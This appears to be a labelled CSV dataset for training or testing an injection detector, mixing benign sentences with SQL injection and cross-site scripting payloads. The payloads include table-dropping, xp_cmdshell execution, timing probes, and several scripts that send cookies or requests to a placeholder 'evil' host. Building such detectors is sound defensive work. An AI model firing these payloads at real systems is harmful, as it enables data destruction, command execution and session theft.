text,label
""") ; DROP TABLE users --",1
The regex \bword\b matches the expected input format.,0
1' OR 'a'='a' -- -,1
The SELECT statement retrieves rows; use WHERE to filter and ORDER BY to sort.,0
""") AND 1=CONVERT(int,@@version) --",1
if (count >= 10 || retry) { throw new Error('x'); },0
"git commit -m ""fix: resolve null pointer in auth module""",0
Smith & Sons Law Firm LLC,0
1'%09AND%09SLEEP(5)%09--,1
Contact Müller at 49 3rd Ave re: the <draft> proposal.,0
Open the file at C:\Users\Admin\setup.bat and edit line 42.,0
<script>print()</script>,1
Contact Kowalski at 86 King's Cross re: the <draft> proposal.,0
Email a_b-c@company.org or ping @a_b-c on Slack.,0
if (x != y && z > 0) { grantAccess(); },0
Contact Müller at 61 O'Connell St re: the <draft> proposal.,0
1'/**/;/**/DROP/**/TABLE/**/users/**/--,1
if (flag & MASK) { throw new Error('x'); },0
1'+;+DROP+TABLE+users+--,1
<input onfocus=alert(document.domain) autofocus>,1
<ScRiPt>location='//evil'</sCrIpT>,1
Contact John at 5 O'Malley Ave re: the <draft> proposal.,0
"<iframe src=""javascript:location='//evil'"">",1
Email dev.ops@company.com or ping @dev.ops on Slack.,0
<body onload=alert(1)>,1
Contact Ng at 60 O'Connell St re: the <draft> proposal.,0
<svg/onload=eval(atob('YWxlcnQoMSk='))>,1
<ScRiPt>fetch('//evil')</sCrIpT>,1
img src=x oNeRRor=/**/(alert)(1),1
"admin')union select user,pass('",1
Contact van der Berg at 28 St. John's Rd re: the <draft> proposal.,0
<ScRiPt>confirm(document.cookie)</sCrIpT>,1
Open the file at C:\Users\Admin\main.py and edit line 42.,0
""") OR 1e0=1e0 --",1
1'/**/AND/**/SLEEP(5)/**/--,1
admin'); exec xp_cmdshell('dir')(',1
<img src=x onerror=alert(1)>,1
if (a['key'] == b['key']) { queue.push(item); },0
"1'%09AND%091=CONVERT(int,@@version)%09--",1
"<iframe src=""javascript:fetch('//evil')"">",1
1`;DROP TABLE `users`;--,1
"<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>",1
<input onfocus=new Image().src='//x?'+document.cookie autofocus>,1
Email a_b-c@company.co.uk or ping @a_b-c on Slack.,0
1'%09OR%091e0=1e0%09--,1
<ScRiPt>print()</sCrIpT>,1
admin')or 'a'='a'(',1
show me the users table where the password equals anything,1
Contact O'Brien at 89 O'Connell St re: the <draft> proposal.,0
"' AND 1=CONVERT(int,@@version) #",1
Contact O'Brien at 46 St. John's Rd re: the <draft> proposal.,0
'%0d%0aOR%0d%0a'a'='a,1
Contact D'Angelo at 70 O'Malley Ave re: the <draft> proposal.,0
<script>fetch('//evil')</script>,1
Contact Kowalski at 84 3rd Ave re: the <draft> proposal.,0
if (user.role == 'admin') { return true; },0
<img src=x onerror=fetch('//evil')>,1
Email team+alerts@company.org or ping @team+alerts on Slack.,0
if (flag & MASK) { queue.push(item); },0
Recipe: mix 2 cups flour w/ 1 tsp salt; bake @ 350F for 20 min.,0
' ; EXEC xp_cmdshell('dir') #,1
Contact Müller at 76 King's Cross re: the <draft> proposal.,0
In the lecture we derived: A OR B = 1 when either is true.,0
Meeting notes 10/25: discussed Q3 <-> Q4 transition plan.,0
Contact Ng at 15 O'Malley Ave re: the <draft> proposal.,0
"She said ""1=1 is always true"" during the boolean-logic lecture.",0
Contact van der Berg at 10 3rd Ave re: the <draft> proposal.,0
if (count >= 10 || retry) { queue.push(item); },0
1'+AND+SLEEP(5)+--,1
eval(atob('YWxlcnQoMSk=')),1
<input onfocus=print() autofocus>,1
Contact Müller at 10 O'Malley Ave re: the <draft> proposal.,0
1'/**/OR/**/0x31=0x31/**/--,1
1'%0aAND%0a1=1%0a#,1
The onclick attribute runs a function when the element is clicked.,0
Contact María at 45 3rd Ave re: the <draft> proposal.,0
1'+OR+'a'='a'+--,1
Contact Kowalski at 26 Rue de l'Église re: the <draft> proposal.,0
Contact O'Malley at 83 Rue de l'Église re: the <draft> proposal.,0
<svg/onload=location='//evil'>,1
if (flag & MASK) { grantAccess(); },0
Contact Müller at 85 Baker St re: the <draft> proposal.,0
if (status == 200) { return true; },0
Contact John at 75 St. John's Rd re: the <draft> proposal.,0
Contact Smith at 6 King's Cross re: the <draft> proposal.,0
1'/**/;/**/EXEC/**/xp_cmdshell('dir')/**/--,1
Contact O'Malley at 35 O'Connell St re: the <draft> proposal.,0
"<iframe src=""javascript:eval(atob('YWxlcnQoMSk='))"">",1
Contact Kowalski at 35 O'Connell St re: the <draft> proposal.,0
""") UNION SELECT NULL,NULL --",1
admin')or ''=''(',1
<script>eval(atob('YWxlcnQoMSk='))</script>,1
1'/**/OR/**/2>1/**/--,1
Contact Smith at 77 Baker St re: the <draft> proposal.,0
1'%09;%09DROP%09TABLE%09users%09--,1
1%0aAND%0a1=1%0a#,1
The regex ^https?://.+$ matches the expected input format.,0
<input onfocus=location='//evil' autofocus>,1
１＇ ＯＲ ＇１＇＝＇１,1
<body onload=print()>,1
1'%09OR%092>1%09--,1
Open the file at C:\Program Files\Tool\config.yml and edit line 42.,0
' OR 0x31=0x31 #,1
